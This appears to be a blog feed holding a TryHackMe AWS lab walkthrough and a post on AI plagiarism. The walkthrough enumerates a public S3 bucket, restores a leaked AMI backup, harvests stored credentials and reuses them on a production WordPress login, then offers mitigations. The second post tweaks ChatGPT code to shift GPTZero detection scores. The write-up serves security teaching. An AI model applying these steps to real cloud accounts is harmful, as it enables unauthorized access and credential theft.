&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Look up the scoped URL.
~$ nslookup bestcloudcompany.org
Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
Name:	bestcloudcompany.org
Address: 44.203.62.152

# Look up the IP from the previous answer
~$ nslookup 44.203.62.152
Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
152.62.203.44.in-addr.arpa	name = ec2-44-203-62-152.compute-1.amazonaws.com.

Authoritative answers can be found from:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, the &lt;em&gt;name&lt;/em&gt; in the second answer shows some evidence of an AWS EC2 service. This tells us that we are working with a web application hosted from an EC2 instance. Since such an instance is effectively a full-on virtual machine, we can further speculate that, if we can find a way in, we can leverage the system’s inbuilt tools (for example, the Linux command line) for lateral movement or secrets enumeration.&lt;/p&gt;

&lt;p&gt;Now, let’s take the &lt;em&gt;assets&lt;/em&gt; subdomain and perform a similar search:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ nslookup assets.bestcloudcompany.org
Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
Name:	assets.bestcloudcompany.org
Address: 18.239.225.25
Name:	assets.bestcloudcompany.org
Address: 18.239.225.57
Name:	assets.bestcloudcompany.org
Address: 18.239.225.109
Name:	assets.bestcloudcompany.org
Address: 18.239.225.94

~$ nslookup 18.239.225.25
Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
25.225.239.18.in-addr.arpa	name = server-18-239-225-25.mia3.r.cloudfront.net.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second answer’s &lt;em&gt;name&lt;/em&gt; reveals that the &lt;em&gt;assets&lt;/em&gt; subdomain is behind AWS CloudFront, a CDN that provides other features like WAF and Firewall rules. You are welcome to poke around at this as an exercise, but be careful not to trigger any WAF protections, such as extreme rate-limiting or IP blocklisting. For now, let’s try a different approach.&lt;/p&gt;

&lt;p&gt;As a heuristic, “assets” may indicate a collection or storage unit with files or objects, regardless of whether they are used by the web application or for some other purpose. We also know that this is behind a CloudFront CDN. A common AWS example of this is hiding an S3 bucket behind CloudFront to limit who can access those files or objects.&lt;/p&gt;

&lt;p&gt;With this in mind, we can hypothesize that, if we can find (or guess) an S3 URI that is publicly accessible, then we can access the bucket itself. Again, the usefulness of this will depend on whether or not the objects in the buckets are open or restricted. (As a further consideration, this &lt;em&gt;could&lt;/em&gt; also indicate an EC2 instance with a file server or a web server that provides the assets. However, an S3 bucket would accomplish the same thing with less effort, so we can push in that direction first.)&lt;/p&gt;

&lt;h2 id=&quot;exploitation-with-aws-services&quot;&gt;Exploitation with AWS services&lt;/h2&gt;

&lt;p&gt;Let’s recap the first section. First, we discovered a public-facing web application running on an EC2 instance. We also found an &lt;em&gt;assets&lt;/em&gt; subdomain whose purpose is not clear at this time.&lt;/p&gt;

&lt;p&gt;During recon, we also gathered a few data points that suggest we are working with an AWS application: the existence of EC2 and CloudFront. Let’s try to push these in order to see if there are any public endpoints, files, or services exposed. Knowing that it is common to hide S3 buckets behind CloudFront, we can try to determine if there is any way to access a bucket associated with the &lt;em&gt;assets&lt;/em&gt; subdomain, and see what else we can do.&lt;/p&gt;

&lt;h3 id=&quot;trying-a-common-s3-naming-convention&quot;&gt;Trying a common S3 naming convention&lt;/h3&gt;

&lt;p&gt;Although there are lists with S3 URL patterns, the default format at the time of writing is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://&amp;lt;bucketname&amp;gt;.s3.amazonaws.com/&amp;lt;filename&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(You can test this in an AWS S3 bucket of your own and test if the convention has changed.)&lt;/p&gt;

&lt;p&gt;An organization may follow a consistent convention for naming their buckets. The specifics will depend on the organization. However, suppose an organization chooses to name their buckets based on a domain or subdomain under their control. Using this, we can try to form an S3 URL like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://assets.bestcloudcompany.org.s3.amazonaws.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the bucket is availble to the public, then opening this in a browser will return an XML with the contents of the buckets or with an “Access Denied” error. In this case, it returns the following, which indicates that this is in fact an S3 bucket whose contents are available to the public web:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;ListBucketResult&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Name&amp;gt;&lt;/span&gt;assets.bestcloudcompany.org&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Name&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Prefix/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Marker/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;MaxKeys&amp;gt;&lt;/span&gt;1000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MaxKeys&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;IsTruncated&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/IsTruncated&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;ami-056a6742115906e8c.bin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;LastModified&amp;gt;&lt;/span&gt;2022-05-04T20:17:01.000Z&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastModified&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;ETag&amp;gt;&lt;/span&gt;&quot;65247a1c5755517a32636c78de3d624a-177&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ETag&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;1483486006&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;StorageClass&amp;gt;&lt;/span&gt;STANDARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StorageClass&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Contents&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;index.html&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, we can see a few key data points:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;em&gt;Name&lt;/em&gt; tag confirms our hypothesis that the subdomain is also the bucket name&lt;/li&gt;
  &lt;li&gt;The contents are available and listed&lt;/li&gt;
  &lt;li&gt;The first &lt;em&gt;Key&lt;/em&gt; tag shows a &lt;em&gt;.bin&lt;/em&gt; file that starts with “ami”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;em&gt;ami&lt;/em&gt; file is interesting as it may refer to an Amazon Machine Images backup. Often, these backups are deployed to S3 buckets. You can download the file and inspect the contents but may not find much of interest; there is no clear file signature (&lt;em&gt;file&lt;/em&gt; reports it as &lt;em&gt;data&lt;/em&gt;), and I haven’t found a way to extract the system contents from one of these files at the time of writing.&lt;/p&gt;

&lt;p&gt;Still, if we can load the system, we can access it and inspect the contents. This may reveal key information: the web application’s source code, hardcoded or stored credentials, and the underlying operating system.&lt;/p&gt;

&lt;h3 id=&quot;restoring-the-ami-vm-image&quot;&gt;Restoring the AMI VM image&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Note: If you are doing this in TryHackMe, you can skip these steps unless you want to learn more about the underlying AWS service configuration. This is intended to build more on the approach from the lab.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The formal way to load an AMI image, even only with the purpose of extracting its contents, is to load it from an S3 bucket and import it as an EC2 instance. The bucket at &lt;em&gt;assets.bestcloudcompany.org&lt;/em&gt; has solved the first step. Now let’s approach the next.&lt;/p&gt;

&lt;p&gt;Instead of setting up the whole environment for analysis, we could &lt;a href=&quot;https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport.html&quot;&gt;export it to another format&lt;/a&gt;: OVA, VMDK, and a few others. This may prove useful if we only want to perform static analysis, or if we want to run the instance outside of AWS. However, we still need to import the AMI file, and since the export process requires another S3 bucket for output, that will take more time and space in the export bucket. In this case, it may be simpler to just set up a simple environment which permits SSH access, then delete those settings after we finish the lab.&lt;/p&gt;

&lt;p&gt;With that in mind, our strategy is to connect to the EC2 instance’s operating system. We can leverage SSH because it’s fairly simple. With AWS, we will need to do the following steps:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Restore the AMI image to an EC2 instance&lt;/li&gt;
  &lt;li&gt;Generate an SSH keypair, which is required for &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html&quot;&gt;AWS SSH connections into EC2 instances&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Create an EC2 security group which allows for inbound and outbound SSH&lt;/li&gt;
  &lt;li&gt;Launch the instance with these settings&lt;/li&gt;
  &lt;li&gt;Connect using SSH and the newly-created private key&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;First, let’s import the AMI VM image into an EC2 instance. Use the AMI key and the &lt;em&gt;assets.bestcloudcompany.org&lt;/em&gt; bucket name, both of which are returned when you open the bucket in a browser. You can use an arbitrary name for the bucket.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 create-restore-image-task \
    --object-key ami-056a6742115906e8c.bin \
    --bucket assets.bestcloudcompany.org \
    --name s3labvm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If successful, it will return an identifier ID. Take note of it as you will need this later.&lt;/p&gt;

&lt;p&gt;Next, create an SSH keypair. This will store your keypair in AWS and allow you to save it to a file. Set the local private key to read-execute only for the owner:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 create-key-pair \
     --key-name THMLabKeys \
     --query &quot;KeyMaterial&quot; \
     --output text &amp;gt; ~/.ssh/bestkeys.pem &amp;amp;&amp;amp; \
   chmod 600 ~/.ssh/bestkeys.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Although you can use any &lt;em&gt;key-name&lt;/em&gt;, take note of it as you will need it when launching the instance.&lt;/p&gt;

&lt;p&gt;Next, create a new EC2 Security Group which permits SSH access. You can do so using the AWS web console or the command line.&lt;/p&gt;

&lt;p&gt;Since this is closer to a prototype than a full-on application, we only need to allow SSH. (Remember to delete this group later if you don’t need it after the lab.) The end result will create a group that looks like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-security-groups --profile default
{
    &quot;SecurityGroups&quot;: [
        ...
        {
            &quot;Description&quot;: &quot;Allows SSH&quot;,
            &quot;GroupName&quot;: &quot;allowSSH&quot;,
            &quot;IpPermissions&quot;: [
                {
                    &quot;FromPort&quot;: 22,
                    &quot;IpProtocol&quot;: &quot;tcp&quot;,
                    &quot;IpRanges&quot;: [
                        {
                            &quot;CidrIp&quot;: &quot;0.0.0.0/0&quot;
                        }
                    ],
                    &quot;Ipv6Ranges&quot;: [],
                    &quot;PrefixListIds&quot;: [],
                    &quot;ToPort&quot;: 22,
                    &quot;UserIdGroupPairs&quot;: []
                }
            ],
            &quot;OwnerId&quot;: &quot;...&quot;,
            &quot;GroupId&quot;: &quot;sg-...&quot;,
            &quot;IpPermissionsEgress&quot;: [
                {
                    &quot;FromPort&quot;: 22,
                    &quot;IpProtocol&quot;: &quot;tcp&quot;,
                    &quot;IpRanges&quot;: [
                        {
                            &quot;CidrIp&quot;: &quot;0.0.0.0/0&quot;
                        }
                    ],
                    &quot;Ipv6Ranges&quot;: [],
                    &quot;PrefixListIds&quot;: [],
                    &quot;ToPort&quot;: 22,
                    &quot;UserIdGroupPairs&quot;: []
                }
            ],
            &quot;VpcId&quot;: &quot;vpc-...&quot;
        }
    ]
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Take note of the &lt;em&gt;GroupId&lt;/em&gt; value, which begins with “sg-“, as you will need it when launching the instance. (In this screenshot, its full value is redacted, but yours will be a small hex string.)&lt;/p&gt;

&lt;p&gt;Now, launch the instance, using the configuration values you got from previous steps. For simplicity, use the &lt;a href=&quot;https://aws.amazon.com/ec2/instance-types/&quot;&gt;t3a.micro instance type&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 run-instances \
    --image-id ami-... \
    --instance-type t3a.micro \
    --key-name THMLabKeys \
    --security-group-id sg-...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Copy the &lt;em&gt;InstanceId&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;It will take a minute for the instance to spin up. You can check it with:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-instance-status --instance-id i-...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The instance will have a &lt;em&gt;Status&lt;/em&gt; of “initializing” until it’s ready. Once ready, you can find the Public IP address using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec2:DescribeInstances&lt;/code&gt; API call along with the instance ID and a query:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-instances \
    --instance-id i-02f05991f4a149991 \
    --query &apos;Reservations[*].Instances[*].PublicIpAddress&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you have the public IP address, you can connect with SSH and your new keypair. We don’t yet know if any users exist on this system; but we do know that SSH by default will permit root access. Let’s try this user first:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ ssh -i ~/.ssh/bestkeys.pem root@&amp;lt;publicIpAddress&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The login attempt fails with a message to try the &lt;em&gt;bitnami&lt;/em&gt; user instead of &lt;em&gt;root&lt;/em&gt;. Modify that SSH command to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bitnami@&amp;lt;publicIpAddress&amp;gt;&lt;/code&gt;. Login is successful.&lt;/p&gt;

&lt;p&gt;Upon login, you can poke around at the environment. This is a Debian-based Linux system, so feel free to leverage any shell commands to find anything of interest. My searching led to a few interesting findings:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A file in the &lt;em&gt;bitnami&lt;/em&gt; user’s home which contains credentials. These credentials are, according to the contents, able to be used for different applications or databases.&lt;/li&gt;
  &lt;li&gt;An HTTP server running on localhost. You can test this with &lt;em&gt;curl&lt;/em&gt;, but the content isn’t easy to read in the shell. To help with this, you could exfiltrate the file (using &lt;em&gt;scp&lt;/em&gt;) to your host system for inspection. I found it easier just to install the &lt;em&gt;w3m&lt;/em&gt; console-based web browser, then open the homepage.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Either way, you’ll notice that the localhost-ed site is nearly identical to the one at &lt;em&gt;bestcloudcompany.org&lt;/em&gt;. We can infer that we might be using a clone of that production site. As further testing, we can prove that &lt;em&gt;localhost/wp-login.php&lt;/em&gt; exists.&lt;/p&gt;

&lt;p&gt;Using the credentials from the file in the home directory, logging in to the &lt;em&gt;localhost&lt;/em&gt; site will succeed, sort of. (It gives a message about changing some administrator settings, but the login itself succeeded; if the credentials were invalid, this would have prompted us to log in again.) Regardless, if this really is a clone of the site, then maybe there’s some credential reuse with both applications.&lt;/p&gt;

&lt;p&gt;Go to &lt;em&gt;https://bestcloudcompany.org/wp-login.php&lt;/em&gt; and try the credentials. Login is successful (womp, womp). The flag is in the user’s profile description, although it doesn’t use any indicators that it is in fact the flag.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;h2 id=&quot;root-cause-analysis&quot;&gt;Root cause analysis&lt;/h2&gt;

&lt;p&gt;The application overall suffers from a few problems, which we can align with the CWE Top 25:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Improper Authorization (CWE-862)&lt;/strong&gt;. Once we identified the S3 bucket’s name, we could view everything within the bucket, including the application server backup, which contains sensitive and useful information.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Improper Authentication (CWE-287)&lt;/strong&gt;. The backup server’s &lt;em&gt;bitnami&lt;/em&gt; account can log in without a password. Since we didn’t observe port 22 open on the production application, the developers may have believed that this is a non-issue, especially since AWS handles the SSH key management. In this case, the backup led to near-direct system access. Further, we might argue that the WordPress application should enforce multifactor authentication.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Use of Hard-Coded Credentials (CWE-798)&lt;/strong&gt;. In this case, the &lt;em&gt;bitnami&lt;/em&gt; account contains the hardcoded credentials for a web-facing account. This might also be an example of “password reuse” which is still a major problem with many organizations and end-users.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;mitigations&quot;&gt;Mitigations&lt;/h2&gt;

&lt;p&gt;To prevent such attacks in the future, the organization might take the following measures.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apply a restrictive policy to S3 buckets. At the bare minimum, limit resources to only valid IAM principals within the organization. Ideally, someting like backups will be accessible only to a subset of members in the organization who work with system backup and restore.&lt;/li&gt;
  &lt;li&gt;Separation of duties. Put backups into a separate, very restrictive bucket to avoid leakage to the public web. If a bucket is used for backups and web content (it shouldn’t), consider creating a folder within the bucket and apply robust IAM policies to that folder and its contents.&lt;/li&gt;
  &lt;li&gt;Leverage multifactor authentication. This prevents anyone with the username and password from gaining direct access to the account. In this case, it would have prevented us from getting the flag.&lt;/li&gt;
  &lt;li&gt;Use unique passwords and avoid password reuse. Where possible, leverage a password wallet and lock down that wallet’s access as appropriate.&lt;/li&gt;
  &lt;li&gt;Remove hardcoded secrets. Although this usually applies to content returned to the user, in this case, we still got the credentials. If the application were vulnerable to command injection, it might be possible to extract them from the public internet, targeting the same file and dumping the file contents.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><summary type="html">This guide will walk you through the AWS S3 labs’ campaign. The intention is to lay out the attack steps as a methodology with a more natural flow than the labs, which fragment the process as it is broken into different sections.</summary></entry><entry><title type="html">Ideas for adapting to A.I. plagiarism in the classroom</title><link href="http://localhost:4000/2023/10/13/chatgpt-assignments.html" rel="alternate" type="text/html" title="Ideas for adapting to A.I. plagiarism in the classroom" /><published>2023-10-13T00:00:00-04:00</published><updated>2023-10-13T00:00:00-04:00</updated><id>http://localhost:4000/2023/10/13/chatgpt-assignments</id><content type="html" xml:base="http://localhost:4000/2023/10/13/chatgpt-assignments.html">&lt;p&gt;A.I. presents a new spin to the classic problem of cheating in higher-level education. To counter these challenges, I offer some ideas on how to develop assignments with the caveats presented by these content-generating platforms. As a whole, this should all promote a shift in the fidelity of assignments as well as the role of the instructional leadership teams for any course.&lt;/p&gt;

&lt;p&gt;As a baseline, I will first use ChatGPT to cheat on an assignment. Then, I will try to use GPTZero to determine if I had cheated in the first place. I conclude with ways to mitigate the cat-and-mouse game of GPT creation and detection, along with considerations for how the instructional team can use these opportunities to forster professional mentorship and create meaningful assignments.&lt;/p&gt;

&lt;p&gt;Let’s begin with our first assignment: generating a Wordle clone in Python.&lt;/p&gt;

&lt;h1 id=&quot;generate-a-four-letter-word&quot;&gt;Generate a four-letter word&lt;/h1&gt;

&lt;p&gt;Recently I was browsing GitHub and came across a fun Wordle clone, written in rather simple Python. For context, I have never played Wordle. So I did a little research and tried to figure out if this solution was a faithful implementation of the game. (It was.)&lt;/p&gt;

&lt;p&gt;While browsing, I encountered a few similar examples, also in Python. One particular implementation caught my eye; not because of the solution, but because the author wrote a working example, had an issue, couldn’t explain the issue, and everyone else rightly pointed out that their code did, actually, work just fine. You see this kind of behavior with undergraduate code, where a well-intended student is learning a langauge and needs some support and maybe some empathy.&lt;/p&gt;

&lt;p&gt;But you also see this with undergraduate plagiarism. The latest version of undergraduate plagiarism is the content-generating features of platforms like ChatGPT, which are free and publicly available.&lt;/p&gt;

&lt;p&gt;As someone who is well out of school, I wondered: Could someone &lt;em&gt;really&lt;/em&gt; use ChatGPT to cheat without gettting caught? To answer this, we can “think like an adversary,” where we try to look for the conditions that can lead a problem to manifest. Then, we can provide recommendations on how to prevent them from manifesting in the first place.&lt;/p&gt;

&lt;p&gt;So, let’s assume that the assignment has a simple parameter: “generate a Worlde game.” In ChatGPT, we can do so with the following query:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Write a Python3 Worlde game&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;You are welcome to reproduce the results on your own. Here were some common patterns in each solution:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;No code comments. This included block comments for function definitions.&lt;/li&gt;
  &lt;li&gt;No empty newlines. This interested me because Python encourages spacing for readability.&lt;/li&gt;
  &lt;li&gt;Only one space between function calls or calsses. This is interesting because PEP8 calls for two spaces between classes or functions in a file&lt;/li&gt;
  &lt;li&gt;Most of the solutions used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if __name__ == &quot;__main__&quot;&lt;/code&gt;. This fascinated me because a lot of junior programmers don’t use this.&lt;/li&gt;
  &lt;li&gt;They all imported the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;random&lt;/code&gt; module and used a remarkably not-random function. We might want to encourage our developers to use functions that all system-level randomness (ex, &lt;em&gt;/dev/urandom&lt;/em&gt;) instead of simple pseudorandom functions.&lt;/li&gt;
  &lt;li&gt;None of the solutions were object-oriented unless explicitly specified. However, ChatGPT’s solution was just a wrapper for the functions used in its non-object-oriented version.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In sum, they were all &lt;em&gt;remarkably similar&lt;/em&gt; to other solutions found online. But, let’s assume good intentions—for now.&lt;/p&gt;

&lt;p&gt;Next, go to GPTZero and paste a few of the generated solutions. In every case, I got a 51% chance that the content was, in fact, generated by a GPT engine. This surprised me at first, since I had hoped for, well, a &lt;em&gt;much higher&lt;/em&gt; score from code that I had just generated for this exact purpose.&lt;/p&gt;

&lt;p&gt;Granted, most of these “GPT detectors” are written with prose in mind. You are welcome to try a similar exercise with a more traditional type of paper or what have you. The point is that these results don’t hold up as well against code, where the rules are well-defined. You could probably engineer something that could detect code plagiarism, but those are not nearly as available for the everyday, underfunded professor.&lt;/p&gt;

&lt;p&gt;Let’s chew on this situation for a minute. If we are generating undergraduate code, it’s probably not that complex anyway; I could imagine this worlde game as a simple, non-summative assessment. Unlike prose, code is understandably more rigid and well-defined by clear, fixed rules. You’re less likely to get the same degree of variance between “Python Worlde game” implementations as you would compared to, say, “Write a novella that feels like &lt;em&gt;Annihilation&lt;/em&gt;.” Finally, the best we can do with a free checker is get a result that is way below our expectations.&lt;/p&gt;

&lt;p&gt;So, 51% is our magic number.&lt;/p&gt;

&lt;h1 id=&quot;cheating-the-polygraph&quot;&gt;Cheating the Polygraph&lt;/h1&gt;

&lt;p&gt;After this, I wanted to know what score it would give for some of these online solutions. I took one of the earlier code examples and ran it through GPTZero.&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;AI Scan&lt;/em&gt; score was a 36%, “likely to be written by a human with a few A.I. sentences.” The plagiarism score read zero.&lt;/p&gt;

&lt;p&gt;I looked back at one solution generated by me, earlier, that looked very similar to this one. The differences were subtle: the A.I. code was missing comments, had no whitespace, and defined the main procedure in global namespace (unscoped).&lt;/p&gt;

&lt;p&gt;With this in mind, I went back to the code in question and did the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Removed comments and empty newlines&lt;/li&gt;
  &lt;li&gt;Added only one space between functions and global variables&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Run it through GPTZero. The A.I. detection score went up to 49%, “moderately likely” to be written by A.I. Interesting.&lt;/p&gt;

&lt;p&gt;I made one final modification. In the code in question, there is a duplicate variable: in global namespace, and in the scope of the main application logic. Most of the GPT examples kept variables in local scopes. So, I removed the global variable. The score raised to 50%.&lt;/p&gt;

&lt;p&gt;So, we’re within 1% of the target score. What does that mean?&lt;/p&gt;

&lt;p&gt;In my honest view, it doesn’t mean much.&lt;/p&gt;

&lt;h1 id=&quot;gotcha&quot;&gt;Gotcha?&lt;/h1&gt;

&lt;p&gt;Suppose your professor takes the same methodology for each and every student in their classes (which they almost certainly do not). Would this be grounds for an Academic Integrity community to take action against a student? Would these numbers be sufficient to identify a student as cheating via ChatGPT?&lt;/p&gt;

&lt;p&gt;Honestly, it doesn’t matter to me. In fact, whole dialogue emphasizes a few root problems that run much deeper than using LLM’s to pass your undergraduate degree.&lt;/p&gt;

&lt;p&gt;First, undergraduate code is notoriously simple from the outset. If A.I. can generate better code solutions than your students, and that code can even evade plagiarism checkers with minor tweaks, it might be time to update your curriculum. In fact, there’s a growing trend in job application pages where the application page will explicitly state that “academic code” is &lt;em&gt;not&lt;/em&gt; an acceptable criteria for employment; we might wonder if this is largely driven by recent trends of students using A.I. to generate simple solutions for simple problems.&lt;/p&gt;

&lt;p&gt;Next, the GPTZero tool wasn’t even reliable for code that I had &lt;em&gt;just&lt;/em&gt; generated from ChatGPT. A 51% success rate is abysmal. However, it may prove challenging (financially or otherwise) for a university to get their hands on a robust tool that can detect if an LLM is used to generate student code solutions. How can we really hold anyone accountable if the tools we’re using for accountability are intrinsically unreliable? This fact alone is enough to warrant some concern and, frankly, to garner some empathy.&lt;/p&gt;

&lt;p&gt;Another major concern here is how academia may react to this. If educators choose to ignore the problem, students will almost certainly continue to generate their code, making just enough changes to evade detection. On the other hand, if the detection mechanisms remain close to useless, educators are powerless to really know if a student has cheated.&lt;/p&gt;

&lt;p&gt;Regardless, it’s a lose-lose for students. The only “gotcha” is that someone has just paid for a degree and learned close to nothing new from it. Computer Engineering or Information Technology curricula should never find itself lovably behind the times.&lt;/p&gt;

&lt;h1 id=&quot;ideas-for-ai-in-the-classroom&quot;&gt;Ideas for A.I. in the classroom&lt;/h1&gt;

&lt;p&gt;Not long ago, postsecondary courses used to shun cellphones. Educators would often tell you to shut it off or leave it in your car. Now, the cellphone is integral to learning opportunities or is a primary means of communication with your professor and other supporters at the institution.&lt;/p&gt;

&lt;p&gt;In the same way, A.I. can be included in the classroom to enhance a student’s understanding of code solutions. Here are some meaningful ideas that educators could begin to explore:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;AI Code Reviews&lt;/strong&gt;. Give everyone in the class a prompt for ChatGPT. Tell them to skim the code and identify any problems they observed. Since each student will generate a somewhat unique solution, their answers should have enough variance to prove that they were, at least, working with unique code. Code reviews can encourage students to identify code-quality or security with the AI code.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;AiOps&lt;/strong&gt;. AI is becoming widely used with DevOps and DevSecOps processes. For example, Github Advanced Security includes AI with their CodeQL and GitHub Copilot tools. The student could explore ways to include AI for better automation. In fact, this could be accomplished in a purely theoretical context, without the need to implement anything concrete; put another way, you should expect that your students will have opportunities to implement AI given the kinds of job openings that currently exist. Examples of an appropriate use case may include an architecture diagram for CI/CD pipelines, or a workflow diagram for where AI can be used in an existing DevOps or DevSecOps process.&lt;/li&gt;
